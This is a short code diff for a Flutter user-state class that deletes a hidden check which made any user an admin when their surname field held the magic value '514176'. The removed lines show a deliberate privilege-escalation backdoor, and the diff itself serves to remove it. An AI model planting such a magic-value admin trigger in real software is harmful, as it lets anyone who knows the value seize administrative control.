@@ -20,16 +20,6 @@ class UserCubit extends HydratedCubit<UserState> {
         ),
       ),
     );
-
-    if (surname == '514176' && !state.user.isAdmin) {
-      promoteToAdmin();
-      return;
-    }
-
-    if (surname != '514176' && state.user.isAdmin) {
-      demoteFromAdmin();
-      return;
-    }
   }
 
   void promoteToAdmin() {
